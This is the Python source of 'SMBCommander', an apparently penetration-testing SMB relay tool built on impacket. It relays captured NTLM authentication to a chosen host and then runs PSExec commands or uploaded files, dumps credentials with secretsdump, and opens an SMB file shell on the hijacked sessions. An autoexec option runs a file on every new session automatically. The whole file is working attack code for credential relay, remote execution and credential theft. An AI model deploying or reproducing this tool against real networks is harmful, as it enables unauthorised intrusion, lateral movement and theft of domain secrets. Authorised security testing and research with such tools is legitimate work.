#!/usr/bin/env python
#
# Author Jack Baker (https://github.com/qwokka/smbcommander)
#
# This product includes software developed by
# SecureAuth Corporation (https://www.secureauth.com/)."
#

import argparse
import curses
import cmd
import logging
import ntpath
import os
import string
import sys
import time

from threading import Thread

from lib import server
from lib import tui
from lib import tuilog
from lib import utils

from impacket.smb import FILE_READ_DATA, FILE_DIRECTORY_FILE
from impacket.smbconnection import SMBConnection
from impacket.smb3 import SessionError
from impacket.smb3structs import FILE_LIST_DIRECTORY, FILE_SHARE_READ, FILE_SHARE_WRITE

# Terminal dimensions to determine which size TUI to use
WIDTH_THRESHOLD     = 150
HEIGHT_THRESHOLD    = 50

class SMBCommander(object):
    def __init__(self, target=None, one_shot=True, socks=False, output_file=None,
                 autorun=False, service_name=False, debug=False, machine_account=None,
                 machine_hashes=None, domain=None):
        self._threads = set()

        self._one_shot          = one_shot

        self._output_file       = output_file

        self._machine_account   = machine_account
        self._machine_hashes    = machine_hashes
        self._domain            = domain

        self._socks = socks

        self._return_status     = "success"

        self.service_name      = service_name

        self.debug              = debug

        self.server = server.SMBCommanderServer(output_file = output_file,
                                                one_shot = one_shot)

        self.server.setTargets(target)
        self.server.setSocks(self._socks)
        self.server.setReturnStatus(self._return_status)
        self.server.setMode("RELAY", self._one_shot)

        self.server_running = False

        height, width = curses.initscr().getmaxyx()

        if width > WIDTH_THRESHOLD:
            self.tui = tui.TUILarge(shell=CommanderShell, server=self.server)
        elif height > HEIGHT_THRESHOLD:
            self.tui = tui.TUISmall(shell=CommanderShell, server=self.server)
        else:
            self.tui = tui.TUITiny(shell=CommanderShell, server=self.server)

        if autorun:
            self.server_start()

    def server_start(self):
        if self._machine_account is not None and     \
           self._machine_hashes is not None and      \
           self._domain is not None:

            self.server.setDomainAccount(self._machine_account,
                                         self._machine_hashes,
                                         self._domain)

        self.server.start()
        self._threads.add(self.server)
        self.server_running = True

class CommanderShell(tui.CursesShell):
    # Tab completion options
    options         = {
        "?": {
            "secretsdump": {},
            "sessions": {},
        },
        "close": {},
        "exit": {},
        "help": {
            "psexec_file": {},
            "psexec_cmd": {},
            "run": {},
            "secretsdump": {},
            "sessions": {},
            "set": {},
            "show": {},
            "smbclient": {},
        },
        "psexec_file": {},
        "psexec_cmd": {},
        "quit": {},
        "run": {},
        "secretsdump": {},
        "sessions": {},
        "set": {
            "autodump": {
                "true": {},
                "false": {},
            },
            "AUTODUMP": {
                "true": {},
                "false": {},
            },
            "autoexec": {
                "true": {},
                "false": {},
            },
            "AUTOEXEC": {
                "true": {},
                "false": {},
            },
            "autoexec_file": {},
            "AUTOEXEC_FILE": {},
            "domain": {},
            "DOMAIN": {},
            "machineacct": {},
            "MACHINEACCT": {},
            "machinehashes": {},
            "MACHINEHASHES": {},
            "oneshot": {
                "true": {},
                "false": {},
            },
            "ONESHOT": {
                "true": {},
                "false": {},
            },
            "socks": {
                "true": {},
                "false": {},
            },
            "SOCKS": {
                "true": {},
                "false": {},
            },
            "svcname": {},
            "SVCNAME": {},
            "target": {},
            "TARGET": {},
        },
        "show": {
            "sessions": {},
            "options": {}
        },
        "smbclient": {},
    }

    def __init__(self, stdin=None, stdout=None):
        self.smbclient_shell = None

        tui.CursesShell.__init__(self, stdin=stdin, stdout=stdout)

    def cmd_loop_once(self):
        if self.smbclient_shell is not None:
            self.prompt = "# "

            self.smbclient_shell.cmd_loop_once()

            if self.smbclient_shell.done:
                del self.smbclient_shell
                self.smbclient_shell = None
                self.output_info("SMBClient shell closed")
        else:
            self.prompt = "> "

            tui.CursesShell.cmd_loop_once(self)

    def text_complete(self, text):
        pieces = text.split(" ")

        prefix = " ".join(pieces[:-1])

        if len(prefix):
            prefix += " "

        if self.smbclient_shell is not None:
            options = self.smbclient_shell.options
        else:
            options = self.options

        for piece in pieces[:-1]:
            if piece in options:
                options = options[piece]

        current = pieces[-1]

        if current:
            matches = [s
                       for s in options
                       if s and s.startswith(current)]
        else:
            matches = [i for i in options]

        return prefix, matches

    def output(self, msg):
        self.stdout.write(msg)

    def output_info(self, msg):
        self.stdout.write("[*] %s" % msg, color=tuilog.LOG_COLOR_INFO)

    def output_warning(self, msg):
        self.stdout.write("[!] %s" % msg, color=tuilog.LOG_COLOR_WARN)

    def output_error(self, msg):
        self.stdout.write("[-] %s" % msg, color=tuilog.LOG_COLOR_ERR)

    def output_success(self, msg):
        self.stdout.write("[+] %s" % msg, color=tuilog.LOG_COLOR_SUCCESS)

    def default(self, line):
        cmd, args = utils.split_args(line)

        self.output_error("Unknown command: \"%s\"" % cmd)

    # Get single session by ID
    def _get_session_by_id(self, sid):
        if sid == "*":
            self.output_error("Command does not support wildcard for sessions")
            return None

        try:
            sess_id = int(sid)
            session = commander.server.getSessions()[sess_id]
            if session is None:
                self.output_error("Bad Session ID \"%s\"" % sid)
            return session
        except ValueError:
            self.output_error("Bad Session ID \"%s\"" % sid)
            return None

    # Get session by ID, allows for wildcard for multiple sessions
    def _get_sessions_by_id(self, sid):
        if sid == "*":
            return commander.server.getSessions()

        try:
            sess_id = int(sid)
            session = commander.server.getSessions()[sess_id]
            if session is None:
                self.output_error("Bad Session ID \"%s\"" % sid)
            return {sess_id: session}
        except KeyError:
            self.output_error("Bad Session ID \"%s\"" % sid)
            return {}

    def do_help(self, line):
        if line:
            subject, _ = utils.split_args(line)
            try:
                func = getattr(self, 'help_' + subject)

                func()
            except AttributeError:
                self.output_error("No help for subject \"%s\"" % subject)
        else:
            self._print_global_help(line)

    # TODO
    def _print_global_help(self, line):
        self.output(" ")
        self.output("Core Commands")
        self.output("=============")
        self.output(" ")

        self.output("\texit/quit/q\tClose sessions and exit")
        self.output("\t<SHIFT>+<TAB>\tSwitch window focus")

        self.output(" ")
        self.output("Server Commands")
        self.output("===============")
        self.output(" ")

        self.output("\trun\t\tStart server")
        self.output("\tsessions\tShow sessions")
        self.output("\tset\t\tSet options")
        self.output("\tshow\t\tShow options/sessions")

        self.output(" ")
        self.output("Session Commands")
        self.output("================")
        self.output(" ")

        self.output("\tpsexec_cmd\tExecute command on session via PSEXEC")
        self.output("\tpsexec_file\tUpload and execute file on session via PSEXEC")
        self.output("\tsecretsdump\tExecute secretsdump on session")
        self.output("\tsmbclient\tOpen smbclient shell on session")

        self.output(" ")
        self.output_info("Type \"help [command]\" for detailed command information")
        self.output(" ")

    def _internal_exit(self):
        commander.server.stop()
        self.done = True

    def do_exit(self, line):
        self._internal_exit()

    def do_quit(self, line):
        self._internal_exit()

    def do_q(self, line):
        self._internal_exit()

    def do_close(self, line):
        sess_id, _ = utils.split_args(line)

        sessions = self._get_sessions_by_id(sess_id)

        for key, session in sessions.iteritems():
            self.output_info("Closing session \"%s\"" % key)
            session.close_session()
            commander.server.clients[key] = None

    def do_run(self, args):
        if commander.server_running:
            self.output_warning("Server already running")
        else:
            self.output_info("Server starting")
            commander.server_start()

    def do_psexec_cmd(self, line):
        sess_id, args = utils.split_args(line)

        if not len(args):
            self.output_error("Usage: psexec_file [sessionid] [file]")
            return

        session = self._get_session_by_id(sess_id)

        command = args[0]

        self.output_info("Executing command \"%s\" on session %s" % (command, sess_id))

        #utils.psexec_cmd(session, command)

        psexec_thread = Thread(target=utils.psexec_cmd, args=(session, cmd))
        psexec_thread.start()

    def do_psexec_file(self, line):
        sess_id, args = utils.split_args(line)

        if not len(args):
            self.output_error("Usage: psexec_file [sessionid] [file]")
            return

        sessions = self._get_sessions_by_id(sess_id)

        if not len(sessions):
            return

        filename = args[0]

        for key, session in sessions.iteritems():
            self.output_info("Executing command \"%s\" on session %s" % (filename, key))

            psexec_thread = Thread(target=utils.psexec_file, args=(session, filename))
            psexec_thread.start()

    def _set_domain(self, domain):
        self.output_info("DOMAIN => %s" % domain)
        commander.server.domainIp = domain

    def _set_machine_account(self, machine_account):
        self.output_info("MACHINEACCT => %s" % machine_account)
        commander.server.machineAccount = machine_account

    def _set_machine_hashes(self, machine_hashes):
        self.output_info("MACHINEHASHES => %s" % machine_hashes)
        commander.server.machineHashes = machine_hashes

    def _set_target(self, target):
        self.output_info("TARGET => %s" % target)
        commander.server.setTargets(target)

    def _set_oneshot(self, value):
        bool_val = utils.parse_bool(value)

        if bool_val is not None:
            self.output_info("ONESHOT => %s" % bool_val)
            commander.server.setMode("RELAY", value)
            return

        self.output_error("Invalid boolean value %s" % value)

    def _set_service_name(self, value):
        self.service_name = value

    def _set_auto_dump(self, value):
        bool_val = utils.parse_bool(value)

        if bool_val is not None:
            commander.server.auto_secretsdump = value
            self.output_info("AUTODUMP => %s" % bool_val)
            return

        self.output_error("Invalid boolean value %s" % value)

    def _set_auto_exec(self, value):
        bool_val = utils.parse_bool(value)

        if bool_val is not None:
            commander.server.auto_exec = value
            self.output_info("AUTOEXEC => %s" % bool_val)

            if commander.server.auto_exec and commander.server.auto_exec_file is None:
                self.output_warning("AUTOEXEC_FILE must also be set before AUTOEXEC " +
                                    "will take effect")
            return

        self.output_error("Invalid boolean value %s" % value)

    def _set_auto_exec_file(self, value):
        commander.server.auto_exec_file = value
        self.output_info("AUTOEXEC_FILE => \"%s\"" % value)

    def do_set(self, line):
        option, args = utils.split_args(line)

        if not option:
            self.output_error("Missing option. Type \"show options\" for more information")
            return
        elif not len(args):
            self.output_error("Missing value. Type \"show options\" for more information")
            return

        option = option.lower()
        value = args[0].lower()

        if option == "autodump":
            self._set_auto_dump(value)
        elif option == "autoexec":
            self._set_auto_exec(value)
        elif option == "autoexec_file":
            self._set_auto_exec_file(value)
        elif option == "domain":
            self._set_domain(value)
        elif option == "machineacct":
            self._set_machine_account(value)
        elif option == "machinehashes":
            self._set_machine_hashes(value)
        elif option == "oneshot":
            self._set_oneshot(value)
        elif option == "socks":
            self.output_error("SOCKS can only be configured at startup (\"-socks\" from " +
                              "command line)")
        elif option == "svcname":
            self._set_service_name(value)
        elif option == "target":
            self._set_target(value)
        else:
            self.output_error("Invalid option \"%s\"" % option)

    def _show_sessions(self):
        sessions = commander.server.getSessions()

        if len(sessions) == 0:
            self.output_error("No active sessions")
        else:
            for index, session in sessions.iteritems():
                self.stdout.write("\t[%s] %s %s\\%s" % (index,
                                                        session.get_remote_host(),
                                                        session.domain.decode("utf-16"),
                                                        session.username.decode("utf-16")))

    # TODO Long lines tend to break output
    def _show_options(self):
        self.stdout.write("\tTARGET\t\t=> %s" % commander.server.target)
        self.stdout.write("\t\tHost to relay the credentials to, if not " +
                          "it will relay it back to the client")

        self.stdout.write("\tONESHOT\t\t=> %s" % commander.server.one_shot)
        self.stdout.write("\t\tAfter successful authentication, only " +

                          "execute the attack once for each target")
        self.stdout.write("\tSOCKS\t\t=> %s" % commander.server.socks)
        self.stdout.write("\t\tLaunch a SOCKS proxy for the connection relayed")

        self.stdout.write("\tSVCNAME\t\t=> %s" % commander.server.service_name)
        self.stdout.write("\t\tName to give created services. " +
                          "Default: random string starting with \"smbcom\"")

        self.stdout.write("\tAUTODUMP\t=> %s" % commander.server.auto_secretsdump)
        self.stdout.write("\t\tExecute secretsdump on each new session automatically")

        self.stdout.write("\tAUTOEXEC\t=> %s" % commander.server.auto_exec)
        self.stdout.write("\t\tPSExec file on each new session automatically (Requires " +
                          "AUTOEXEC_FILE to be set)")

        self.stdout.write("\tAUTOEXEC_FILE\t=> %s" % commander.server.auto_exec_file)
        self.stdout.write("\t\tFile to PSExec on each new session (Requires AUTOEXEC => True)")

        self.stdout.write("\tMACHINEACCT\t=> %s" % commander.server.machineAccount)
        self.stdout.write("\t\tDomain machine account to use when interacting with the ")
        self.stdout.write("\t\tdomain to grab a session key for signing, format is ")
        self.stdout.write("\t\tdomain/machine_name")

        self.stdout.write("\tMACHINEHASHES\t=> %s" % commander.server.machineHashes)
        self.stdout.write("\t\tDomain machine hashes, format is LMHASH:NTHASH")

        self.stdout.write("\tDOMAIN\t\t=> %s" % commander.server.domainIp)
        self.stdout.write("\t\tDomain FQDN or IP to connect using NETLOGON")

    def do_show(self, line):
        option, _ = utils.split_args(line)

        if not option:
            self.output("Accepted options:")
            self.output("\tsessions")
            self.output("\toptions")
            return

        option = option.lower()

        if option == "sessions":
            self._show_sessions()
        elif option == "options":
            self._show_options()
        else:
            self.output_error("Invalid option %s" % option)

    def do_sessions(self, args):
        logging.info(commander.server.getSessions())
        self._show_sessions()

    def help_sessions(self):
        self.output("Display sessions")

    def do_secretsdump(self, args):
        args = args.lower().split()

        if len(args) < 1:
            self.output_error("Usage: secretsdump [sessionid]")
            return

        sessions = self._get_sessions_by_id(args[0])

        if not len(sessions):
            return

        for key, session in sessions.iteritems():
            self.output_info("Executing secretsdump on session \"%s\"" % key)

            secretsdump_thread = Thread(target=utils.secretsdump, args=(session, ))
            secretsdump_thread.start()

    def help_secretsdump(self):
        self.output("Execute secretsdump.py on session")
        self.output("Usage: secretsdump [sessionid]")

    def do_smbclient(self, args):
        args = args.lower().split()

        if len(args) < 1:
            self.output_error("Usage smbclient [sessionid]")
            return

        sess_id = args[0]

        session = self._get_session_by_id(sess_id)

        if session is None:
            return

        try:
            connection = SMBConnection(existingConnection = session)
        except Exception, e:
            logging.error(str(e))
            return

        self.smbclient_shell = CommanderImpacketShell(connection,
                                                      stdin=self.stdin,
                                                      stdout=self.stdout)

        self.output_info("Opening SMBClient shell for session %s" % sess_id)

    def help_smbclient(self):
        self.output("Usage: smbclient [sessionid]")
        self.output("Spawn smbclient.py shell from session")

class CommanderImpacketShell(tui.CursesShell):
    prompt = "# "

    # TODO
    options         = {
        "shares": {},
        "use": {},
        "cd": {},
        "lcd": {},
        "pwd": {},
        "ls": {},
        "rm": {},
        "mkdir": {},
        "rmdir": {},
        "put": {},
        "get": {},
        "info": {},
    }

    def __init__(self, smbClient, stdin=None, stdout=None):
        cmd.Cmd.__init__(self, stdin=stdin, stdout=stdout)

        self.prompt = '# '
        self.smb = smbClient
        (self.username,
         self.password,
         self.domain,
         self.lmhash,
         self.nthash,
         self.aesKey,
         self.TGT,
         self.TGS) = smbClient.getCredentials()
        self.tid = None
        self.intro = 'Type help for list of commands'
        self.pwd = ''
        self.share = None
        self.last_output = None
        self.completion = []

        self.done = False

    def emptyline(self):
        pass

    def do_exit(self, args):
        self.done = True

    def do_help(self,line):
        self.stdout.write("shares - list available shares")
        self.stdout.write("use {sharename} - connect to an specific share")
        self.stdout.write("cd {path} - changes the current directory to {path}")
        self.stdout.write("lcd {path} - changes the current local directory to {path}")
        self.stdout.write("pwd - shows current remote directory")
        self.stdout.write("ls {wildcard} - lists all the files in the current directory")
        self.stdout.write("rm {file} - removes the selected file")
        self.stdout.write("mkdir {dirname} - creates the directory under the current path")
        self.stdout.write("rmdir {dirname} - removes the directory under the current path")
        self.stdout.write("put {filename} - uploads the filename into the current path")
        self.stdout.write("get {filename} - downloads the filename from the current path")
        self.stdout.write("info - returns NetrServerInfo main results")
        self.stdout.write("who - returns the sessions currently connected at the target " +
                          "host (admin required)")
        self.stdout.write("exit - terminates the smbclient shell")

    def do_shares(self, line):
        resp = self.smb.listShares()
        for i in range(len(resp)):
            self.stdout.write(resp[i]['shi1_netname'][:-1])

    def do_use(self,line):
        self.share = line
        self.tid = self.smb.connectTree(line)
        self.pwd = '\\'
        self.do_ls('', False)

    def complete_cd(self, text, line, begidx, endidx):
        return self.complete_get(text, line, begidx, endidx, include = 2)

    def do_cd(self, line):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        p = string.replace(line,'/','\\')
        oldpwd = self.pwd
        if p[0] == '\\':
            self.pwd = line
        else:
            self.pwd = ntpath.join(self.pwd, line)
        self.pwd = ntpath.normpath(self.pwd)
        # Let's try to open the directory to see if it's valid
        try:
            fid = self.smb.openFile(self.tid, self.pwd, creationOption = FILE_DIRECTORY_FILE \
                                    , desiredAccess = FILE_READ_DATA | FILE_LIST_DIRECTORY \
                                    , shareMode = FILE_SHARE_READ | FILE_SHARE_WRITE \
                                    )
            self.smb.closeFile(self.tid,fid)
        except SessionError:
            self.pwd = oldpwd
            raise

    def do_lcd(self, s):
        print s
        if s == '':
            print os.getcwd()
        else:
            os.chdir(s)

    def do_pwd(self,line):
        print self.pwd

    def do_ls(self, wildcard, display = True):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        if wildcard == '':
            pwd = ntpath.join(self.pwd,'*')
        else:
            pwd = ntpath.join(self.pwd, wildcard)
        self.completion = []
        pwd = string.replace(pwd,'/','\\')
        pwd = ntpath.normpath(pwd)
        for f in self.smb.listPath(self.share, pwd):
            if display is True:
                self.stdout.write("%crw-rw-rw- %10d  %s %s" % (
                    'd' if f.is_directory() > 0 else '-',
                    f.get_filesize(),
                    time.ctime(float(f.get_mtime_epoch())),
                    f.get_longname()))
            self.completion.append((f.get_longname(), f.is_directory()))


    def do_rm(self, filename):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        f = ntpath.join(self.pwd, filename)
        file = string.replace(f,'/','\\')
        try:
            self.smb.deleteFile(self.share, file)
        except Exception, e:
            self.stdout.write(str(e))
            pass

    def do_mkdir(self, path):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        p = ntpath.join(self.pwd, path)
        pathname = string.replace(p,'/','\\')
        self.smb.createDirectory(self.share,pathname)

    def do_rmdir(self, path):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        p = ntpath.join(self.pwd, path)
        pathname = string.replace(p,'/','\\')
        try:
            self.smb.deleteDirectory(self.share, pathname)
        except Exception, e:
            self.stdout.write(str(e))

    def do_put(self, pathname):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        src_path = pathname
        dst_name = os.path.basename(src_path)

        fh = open(pathname, 'rb')
        f = ntpath.join(self.pwd,dst_name)
        finalpath = string.replace(f,'/','\\')
        self.smb.putFile(self.share, finalpath, fh.read)
        fh.close()

    def complete_get(self, text, line, begidx, endidx, include = 1):
        # include means
        # 1 just files
        # 2 just directories
        p = string.replace(line,'/','\\')
        if p.find('\\') < 0:
            items = []
            if include == 1:
                mask = 0
            else:
                mask = 0x010
            for i in self.completion:
                if i[1] == mask:
                    items.append(i[0])
            if text:
                return  [
                    item for item in items
                    if item.upper().startswith(text.upper())
                ]
            else:
                return items

    def do_get(self, filename):
        if self.tid is None:
            self.stdout.write("No share selected")
            return
        filename = string.replace(filename,'/','\\')
        fh = open(ntpath.basename(filename),'wb')
        pathname = ntpath.join(self.pwd,filename)
        try:
            self.smb.getFile(self.share, pathname, fh.write)
        except:
            fh.close()
            os.remove(filename)
            raise
        fh.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=False,
                                     description="For every connection received, this module "  +
                                     "will try to SMB relay that connection to the target "     +
                                     "system or the original client")
    parser.add_argument("--help", action="help", help='Show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-h', action='store', metavar='HOST',
                        help="Host to relay the credentials to, if not it will relay it back "  +
                        "to the client")
    parser.add_argument('-socks', action='store_true', default=False,
                        help='Launch a SOCKS proxy for the connection relayed')
    parser.add_argument('-one-shot', action='store_true', default=False,
                        help="After successful authentication, only execute the attack once "   +
                        "for each target")
    parser.add_argument('-outputfile', action='store',
                        help="Base output filename for encrypted hashes. Suffixes will be "     +
                        "added for ntlm and ntlmv2")
    parser.add_argument('-machine-account', action='store', required=False,
                        help="Domain machine account to use when interacting with the domain "  +
                        "to grab a session key for signing, format is domain/machine_name")
    parser.add_argument('-machine-hashes', action="store", metavar="LMHASH:NTHASH",
                        help="Domain machine hashes, format is LMHASH:NTHASH")
    parser.add_argument('-domain', action="store", help="Domain FQDN or IP to connect using "   +
                        "NETLOGON")
    parser.add_argument('-r', action="store_true", default=False, help="Start SMB server "      +
                        "immediately (Requires -h options)")

    try:
        cmd_options = parser.parse_args()
    except Exception, e:
        logging.error(str(e))
        sys.exit(1)

    if cmd_options.r and cmd_options.h is None:
        logging.error("Can't autostart server without target argument (-h)")
        sys.exit(1)

    if (cmd_options.machine_account is not None or      \
        cmd_options.machine_hashes is not None or       \
        cmd_options.domain is not None) and             \
       (cmd_options.machine_account is None or          \
        cmd_options.machine_hashes is None or           \
        cmd_options.domain is None):
        logging.error("You must specify machine-account/hashes/domain all together!")
        sys.exit(1)

    commander = SMBCommander(target             = cmd_options.h,
                             one_shot           = cmd_options.one_shot,
                             socks              = cmd_options.socks,
                             output_file        = cmd_options.outputfile,
                             autorun            = cmd_options.r,
                             debug              = cmd_options.debug,
                             machine_account    = cmd_options.machine_account,
                             machine_hashes     = cmd_options.machine_hashes,
                             domain             = cmd_options.domain)

    utils.init_global(commander)

    curses.wrapper(commander.tui.run)
